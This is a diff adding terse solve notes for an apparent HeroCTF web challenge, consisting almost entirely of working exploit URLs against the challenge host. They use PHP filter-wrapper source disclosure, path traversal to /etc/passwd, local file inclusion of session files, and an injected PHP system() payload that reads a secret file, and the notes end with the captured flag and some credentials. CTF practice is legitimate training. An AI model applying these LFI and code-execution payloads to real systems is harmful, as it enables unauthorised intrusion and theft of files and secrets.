@@ -1,0 +1,20 @@
+http://challs.heroctf.fr:3005/index.php?page=php://filter/read=convert.base64-encode/resource=login.php
+
+HeroCTFAREdaBest
+ThisISASUPERPassword
+-> not this
+
+in index.php -> sessions name
+
+http://challs.heroctf.fr:3005/OhD4Sessions/sess_f0759df31bce357006408b6661634c2c
+->see last request in it
+
+http://challs.heroctf.fr:3005/?page=../../../../../../../etc/passwd
+-> /home/haxorhome
+
+!!! USE LFI TO CHECK SESS
+http://challs.heroctf.fr:3005/index.php?page=OhD4Sessions/sess_5df6d1c9d4723cb15fd285897ff68eff
+
+http://challs.heroctf.fr:3005/index.php?page=%3C?php%20echo%20system(%22cat%20/home/haxorhome/mySup3rs3cr3tfile.txt%22);%20?%3E
+
+Hero{p4y_4tt3nt10n_t0_s3ss1on_n3xt_t1m3_!!}
